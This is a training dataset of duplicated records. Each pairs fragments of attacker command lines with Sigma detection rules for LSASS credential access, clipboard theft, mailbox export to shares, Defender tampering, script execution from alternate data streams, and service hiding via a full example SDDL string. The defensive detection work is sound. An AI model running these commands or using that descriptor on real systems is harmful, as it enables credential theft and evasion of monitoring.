{"instruction": "Write Sigma rule to detect payload:", "input": "Get-Process gps lsas lsas lsas ps", "output": "title: PowerShell Get-Process LSASS\nid: b2815d0d-7481-4bf0-9b6c-a4c48a94b349\nstatus: test\ndescription: Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which is in almost all cases a sign of malicious activity\nreferences:\n    - https://web.archive.org/web/20220205033028/https://twitter.com/PythonResponder/status/1385064506049630211\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-04-23\nmodified: 2023-01-05\ntags:\n    - attack.credential-access\n    - attack.t1552.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # You can add more permutation as you see fit\n            - 'Get-Process lsas'\n            - 'ps lsas'\n            - 'gps lsas'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Get-Clipboard", "output": "title: PowerShell Get-Clipboard Cmdlet Via CLI\nid: b9aeac14-2ffd-4ad3-b967-1354a4e628c3\nrelated:\n    - id: 4cbd4f12-2e22-43e3-882f-bff3247ffb78\n      type: derived\nstatus: test\ndescription: Detects usage of the 'Get-Clipboard' cmdlet via CLI\nreferences:\n    - https://github.com/OTRF/detection-hackathon-apt29/issues/16\n    - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-05-02\nmodified: 2022-12-25\ntags:\n    - attack.collection\n    - attack.t1115\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'Get-Clipboard'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Get-Clipboard", "output": "title: PowerShell Get-Clipboard Cmdlet Via CLI\nid: b9aeac14-2ffd-4ad3-b967-1354a4e628c3\nrelated:\n    - id: 4cbd4f12-2e22-43e3-882f-bff3247ffb78\n      type: derived\nstatus: test\ndescription: Detects usage of the 'Get-Clipboard' cmdlet via CLI\nreferences:\n    - https://github.com/OTRF/detection-hackathon-apt29/issues/16\n    - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-05-02\nmodified: 2022-12-25\ntags:\n    - attack.collection\n    - attack.t1115\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'Get-Clipboard'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Get-Clipboard", "output": "title: PowerShell Get-Clipboard Cmdlet Via CLI\nid: b9aeac14-2ffd-4ad3-b967-1354a4e628c3\nrelated:\n    - id: 4cbd4f12-2e22-43e3-882f-bff3247ffb78\n      type: derived\nstatus: test\ndescription: Detects usage of the 'Get-Clipboard' cmdlet via CLI\nreferences:\n    - https://github.com/OTRF/detection-hackathon-apt29/issues/16\n    - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-05-02\nmodified: 2022-12-25\ntags:\n    - attack.collection\n    - attack.t1115\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'Get-Clipboard'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pwsh.exe pwsh.dll Set-Service DCLCWPDTSD -SecurityDescriptorSddl -sd", "output": "title: Abuse of Service Permissions to Hide Services Via Set-Service\nid: 514e4c3a-c77d-4cde-a00f-046425e2301e\nrelated:\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0\n      type: derived\n    - id: 953945c5-22fe-4a92-9f8a-a9edc1e522da\n      type: similar\nstatus: test\ndescription: Detects usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)\nreferences:\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-17\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\pwsh.exe'\n        - OriginalFileName: 'pwsh.dll'\n    selection_sddl:\n        # Example would be: \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n        CommandLine|contains|all:\n            - 'Set-Service '\n            - 'DCLCWPDTSD'\n    selection_cmdlet:\n        CommandLine|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    condition: all of selection_*\nfalsepositives:\n    - Rare intended use of hidden services\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pwsh.exe pwsh.dll Set-Service \\\"DCLCWPDTSD\\\" \\\"-SecurityDescriptorSddl\\\" -sd", "output": "title: Abuse of Service Permissions to Hide Services Via Set-Service\nid: 514e4c3a-c77d-4cde-a00f-046425e2301e\nrelated:\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0\n      type: derived\n    - id: 953945c5-22fe-4a92-9f8a-a9edc1e522da\n      type: similar\nstatus: test\ndescription: Detects usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)\nreferences:\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-17\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\pwsh.exe'\n        - OriginalFileName: 'pwsh.dll'\n    selection_sddl:\n        # Example would be: \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n        CommandLine|contains|all:\n            - 'Set-Service '\n            - 'DCLCWPDTSD'\n    selection_cmdlet:\n        CommandLine|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    condition: all of selection_*\nfalsepositives:\n    - Rare intended use of hidden services\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pwsh pwsh.dll Set-Service DCLCWPDTSD -SecurityDescriptorSddl -sd", "output": "title: Abuse of Service Permissions to Hide Services Via Set-Service\nid: 514e4c3a-c77d-4cde-a00f-046425e2301e\nrelated:\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0\n      type: derived\n    - id: 953945c5-22fe-4a92-9f8a-a9edc1e522da\n      type: similar\nstatus: test\ndescription: Detects usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)\nreferences:\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-17\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\pwsh.exe'\n        - OriginalFileName: 'pwsh.dll'\n    selection_sddl:\n        # Example would be: \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n        CommandLine|contains|all:\n            - 'Set-Service '\n            - 'DCLCWPDTSD'\n    selection_cmdlet:\n        CommandLine|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    condition: all of selection_*\nfalsepositives:\n    - Rare intended use of hidden services\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pwsh.exe pwsh.dll DCLCWPDTSD Set-Service -SecurityDescriptorSddl -sd", "output": "title: Abuse of Service Permissions to Hide Services Via Set-Service\nid: 514e4c3a-c77d-4cde-a00f-046425e2301e\nrelated:\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0\n      type: derived\n    - id: 953945c5-22fe-4a92-9f8a-a9edc1e522da\n      type: similar\nstatus: test\ndescription: Detects usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)\nreferences:\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-17\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\pwsh.exe'\n        - OriginalFileName: 'pwsh.dll'\n    selection_sddl:\n        # Example would be: \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n        CommandLine|contains|all:\n            - 'Set-Service '\n            - 'DCLCWPDTSD'\n    selection_cmdlet:\n        CommandLine|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    condition: all of selection_*\nfalsepositives:\n    - Rare intended use of hidden services\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "New-MailboxExportRequest -Mailbox -FilePath \\\\\\\\", "output": "title: Suspicious PowerShell Mailbox Export to Share\nid: 889719ef-dd62-43df-86c3-768fb08dc7c0\nstatus: test\ndescription: Detects usage of the powerShell New-MailboxExportRequest Cmdlet to exports a mailbox to a remote or local share, as used in ProxyShell exploitations\nreferences:\n    - https://youtu.be/5mqid-7zp8k?t=2481\n    - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html\n    - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1\n    - https://m365internals.com/2022/10/07/hunting-in-on-premises-exchange-server-logs/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-07\nmodified: 2022-10-26\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'New-MailboxExportRequest'\n            - ' -Mailbox '\n            - ' -FilePath \\\\\\\\'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "New-MailboxExportRequest -Mailbox -FilePath \\\"\\\\\\\\\\\"", "output": "title: Suspicious PowerShell Mailbox Export to Share\nid: 889719ef-dd62-43df-86c3-768fb08dc7c0\nstatus: test\ndescription: Detects usage of the powerShell New-MailboxExportRequest Cmdlet to exports a mailbox to a remote or local share, as used in ProxyShell exploitations\nreferences:\n    - https://youtu.be/5mqid-7zp8k?t=2481\n    - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html\n    - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1\n    - https://m365internals.com/2022/10/07/hunting-in-on-premises-exchange-server-logs/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-07\nmodified: 2022-10-26\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'New-MailboxExportRequest'\n            - ' -Mailbox '\n            - ' -FilePath \\\\\\\\'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "New-MailboxExportRequest \\\\\\\\ -FilePath -Mailbox", "output": "title: Suspicious PowerShell Mailbox Export to Share\nid: 889719ef-dd62-43df-86c3-768fb08dc7c0\nstatus: test\ndescription: Detects usage of the powerShell New-MailboxExportRequest Cmdlet to exports a mailbox to a remote or local share, as used in ProxyShell exploitations\nreferences:\n    - https://youtu.be/5mqid-7zp8k?t=2481\n    - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html\n    - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1\n    - https://m365internals.com/2022/10/07/hunting-in-on-premises-exchange-server-logs/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-07\nmodified: 2022-10-26\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'New-MailboxExportRequest'\n            - ' -Mailbox '\n            - ' -FilePath \\\\\\\\'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Install-TransportAgent", "output": "title: MSExchange Transport Agent Installation\nid: 83809e84-4475-4b69-bc3e-4aad8568612f\nrelated:\n    - id: 83809e84-4475-4b69-bc3e-4aad8568612f\n      type: similar\nstatus: test\ndescription: Detects the Installation of a Exchange Transport Agent\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=7\nauthor: Tobias Michalski (Nextron Systems)\ndate: 2021-06-08\nmodified: 2022-10-09\ntags:\n    - attack.persistence\n    - attack.t1505.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains: 'Install-TransportAgent'\n    condition: selection\nfields:\n    - AssemblyPath\nfalsepositives:\n    - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Install-TransportAgent", "output": "title: MSExchange Transport Agent Installation\nid: 83809e84-4475-4b69-bc3e-4aad8568612f\nrelated:\n    - id: 83809e84-4475-4b69-bc3e-4aad8568612f\n      type: similar\nstatus: test\ndescription: Detects the Installation of a Exchange Transport Agent\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=7\nauthor: Tobias Michalski (Nextron Systems)\ndate: 2021-06-08\nmodified: 2022-10-09\ntags:\n    - attack.persistence\n    - attack.t1505.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains: 'Install-TransportAgent'\n    condition: selection\nfields:\n    - AssemblyPath\nfalsepositives:\n    - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Install-TransportAgent", "output": "title: MSExchange Transport Agent Installation\nid: 83809e84-4475-4b69-bc3e-4aad8568612f\nrelated:\n    - id: 83809e84-4475-4b69-bc3e-4aad8568612f\n      type: similar\nstatus: test\ndescription: Detects the Installation of a Exchange Transport Agent\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=7\nauthor: Tobias Michalski (Nextron Systems)\ndate: 2021-06-08\nmodified: 2022-10-09\ntags:\n    - attack.persistence\n    - attack.t1505.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains: 'Install-TransportAgent'\n    condition: selection\nfields:\n    - AssemblyPath\nfalsepositives:\n    - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Invoke-ATHRemoteFXvGPUDisablementCommand Invoke-ATHRemoteFXvGPUDisableme", "output": "title: RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses\nid: a6fc3c46-23b8-4996-9ea2-573f4c4d88c5\nrelated:\n    - id: f65e22f9-819e-4f96-9c7b-498364ae7a25 # PS Classic\n      type: similar\n    - id: 38a7625e-b2cb-485d-b83d-aff137d859f4 # PS Module\n      type: similar\n    - id: cacef8fc-9d3d-41f7-956d-455c6e881bc5 # PS ScriptBlock\n      type: similar\nstatus: test\ndescription: Detects calls to the AtomicTestHarnesses \"Invoke-ATHRemoteFXvGPUDisablementCommand\" which is designed to abuse the \"RemoteFXvGPUDisablement.exe\" binary to run custom PowerShell code via module load-order hijacking.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\nauthor: frack113\ndate: 2021-07-13\nmodified: 2023-05-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Invoke-ATHRemoteFXvGPUDisablementCommand'\n            - 'Invoke-ATHRemoteFXvGPUDisableme'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Invoke-ATHRemoteFXvGPUDisablementCommand \"Invoke-ATHRemoteFXvGPUDisableme\"", "output": "title: RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses\nid: a6fc3c46-23b8-4996-9ea2-573f4c4d88c5\nrelated:\n    - id: f65e22f9-819e-4f96-9c7b-498364ae7a25 # PS Classic\n      type: similar\n    - id: 38a7625e-b2cb-485d-b83d-aff137d859f4 # PS Module\n      type: similar\n    - id: cacef8fc-9d3d-41f7-956d-455c6e881bc5 # PS ScriptBlock\n      type: similar\nstatus: test\ndescription: Detects calls to the AtomicTestHarnesses \"Invoke-ATHRemoteFXvGPUDisablementCommand\" which is designed to abuse the \"RemoteFXvGPUDisablement.exe\" binary to run custom PowerShell code via module load-order hijacking.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\nauthor: frack113\ndate: 2021-07-13\nmodified: 2023-05-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Invoke-ATHRemoteFXvGPUDisablementCommand'\n            - 'Invoke-ATHRemoteFXvGPUDisableme'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Invoke-ATHRemoteFXvGPUDisablementCommand Invoke-ATHRemoteFXvGPUDisableme", "output": "title: RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses\nid: a6fc3c46-23b8-4996-9ea2-573f4c4d88c5\nrelated:\n    - id: f65e22f9-819e-4f96-9c7b-498364ae7a25 # PS Classic\n      type: similar\n    - id: 38a7625e-b2cb-485d-b83d-aff137d859f4 # PS Module\n      type: similar\n    - id: cacef8fc-9d3d-41f7-956d-455c6e881bc5 # PS ScriptBlock\n      type: similar\nstatus: test\ndescription: Detects calls to the AtomicTestHarnesses \"Invoke-ATHRemoteFXvGPUDisablementCommand\" which is designed to abuse the \"RemoteFXvGPUDisablement.exe\" binary to run custom PowerShell code via module load-order hijacking.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\nauthor: frack113\ndate: 2021-07-13\nmodified: 2023-05-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Invoke-ATHRemoteFXvGPUDisablementCommand'\n            - 'Invoke-ATHRemoteFXvGPUDisableme'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Remove-MpPreference -ControlledFolderAccessProtectedFolders -AttackSurfaceReductionRules_Ids -AttackSurfaceReductionRules_Actions -CheckForSignaturesBeforeRunningScan", "output": "title: Tamper Windows Defender Remove-MpPreference\nid: 07e3cb2c-0608-410d-be4b-1511cb1a0448\nrelated:\n    - id: ae2bdd58-0681-48ac-be7f-58ab4e593458\n      type: similar\nstatus: test\ndescription: Detects attempts to remove Windows Defender configurations using the 'MpPreference' cmdlet\nreferences:\n    - https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-controlled-folder-access-event-search/ba-p/2326088\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_remove:\n        CommandLine|contains: 'Remove-MpPreference'\n    selection_tamper:\n        CommandLine|contains:\n            - '-ControlledFolderAccessProtectedFolders '\n            - '-AttackSurfaceReductionRules_Ids '\n            - '-AttackSurfaceReductionRules_Actions '\n            - '-CheckForSignaturesBeforeRunningScan '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Remove-MpPreference -ControlledFolderAccessProtectedFolders \"-AttackSurfaceReductionRules_Ids\" -AttackSurfaceReductionRules_Actions -CheckForSignaturesBeforeRunningScan", "output": "title: Tamper Windows Defender Remove-MpPreference\nid: 07e3cb2c-0608-410d-be4b-1511cb1a0448\nrelated:\n    - id: ae2bdd58-0681-48ac-be7f-58ab4e593458\n      type: similar\nstatus: test\ndescription: Detects attempts to remove Windows Defender configurations using the 'MpPreference' cmdlet\nreferences:\n    - https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-controlled-folder-access-event-search/ba-p/2326088\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_remove:\n        CommandLine|contains: 'Remove-MpPreference'\n    selection_tamper:\n        CommandLine|contains:\n            - '-ControlledFolderAccessProtectedFolders '\n            - '-AttackSurfaceReductionRules_Ids '\n            - '-AttackSurfaceReductionRules_Actions '\n            - '-CheckForSignaturesBeforeRunningScan '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Remove-MpPreference -CheckForSignaturesBeforeRunningScan -ControlledFolderAccessProtectedFolders -AttackSurfaceReductionRules_Actions -AttackSurfaceReductionRules_Ids", "output": "title: Tamper Windows Defender Remove-MpPreference\nid: 07e3cb2c-0608-410d-be4b-1511cb1a0448\nrelated:\n    - id: ae2bdd58-0681-48ac-be7f-58ab4e593458\n      type: similar\nstatus: test\ndescription: Detects attempts to remove Windows Defender configurations using the 'MpPreference' cmdlet\nreferences:\n    - https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-controlled-folder-access-event-search/ba-p/2326088\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_remove:\n        CommandLine|contains: 'Remove-MpPreference'\n    selection_tamper:\n        CommandLine|contains:\n            - '-ControlledFolderAccessProtectedFolders '\n            - '-AttackSurfaceReductionRules_Ids '\n            - '-AttackSurfaceReductionRules_Actions '\n            - '-CheckForSignaturesBeforeRunningScan '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe \\powershell.exe \\pwsh.exe Get-Content -Stream", "output": "title: Run PowerShell Script from ADS\nid: 45a594aa-1fbd-4972-a809-ff5a99dd81b8\nstatus: test\ndescription: Detects PowerShell script execution from Alternate Data Stream (ADS)\nreferences:\n    - https://github.com/p0shkatz/Get-ADS/blob/1c3a3562e713c254edce1995a7d9879c687c7473/Get-ADS.ps1\nauthor: Sergey Soldatov, Kaspersky Lab, oscd.community\ndate: 2019-10-30\nmodified: 2022-07-14\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains|all:\n            - 'Get-Content'\n            - '-Stream'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe \\powershell.exe \\pwsh.exe Get-Content \\\"-\\\"\\\"S\\\"\\\"t\\\"\\\"r\\\"\\\"e\\\"\\\"a\\\"\\\"m\\\"", "output": "title: Run PowerShell Script from ADS\nid: 45a594aa-1fbd-4972-a809-ff5a99dd81b8\nstatus: test\ndescription: Detects PowerShell script execution from Alternate Data Stream (ADS)\nreferences:\n    - https://github.com/p0shkatz/Get-ADS/blob/1c3a3562e713c254edce1995a7d9879c687c7473/Get-ADS.ps1\nauthor: Sergey Soldatov, Kaspersky Lab, oscd.community\ndate: 2019-10-30\nmodified: 2022-07-14\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains|all:\n            - 'Get-Content'\n            - '-Stream'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell \\pwsh \\powershell \\pwsh Get-Content -Stream", "output": "title: Run PowerShell Script from ADS\nid: 45a594aa-1fbd-4972-a809-ff5a99dd81b8\nstatus: test\ndescription: Detects PowerShell script execution from Alternate Data Stream (ADS)\nreferences:\n    - https://github.com/p0shkatz/Get-ADS/blob/1c3a3562e713c254edce1995a7d9879c687c7473/Get-ADS.ps1\nauthor: Sergey Soldatov, Kaspersky Lab, oscd.community\ndate: 2019-10-30\nmodified: 2022-07-14\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains|all:\n            - 'Get-Content'\n            - '-Stream'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
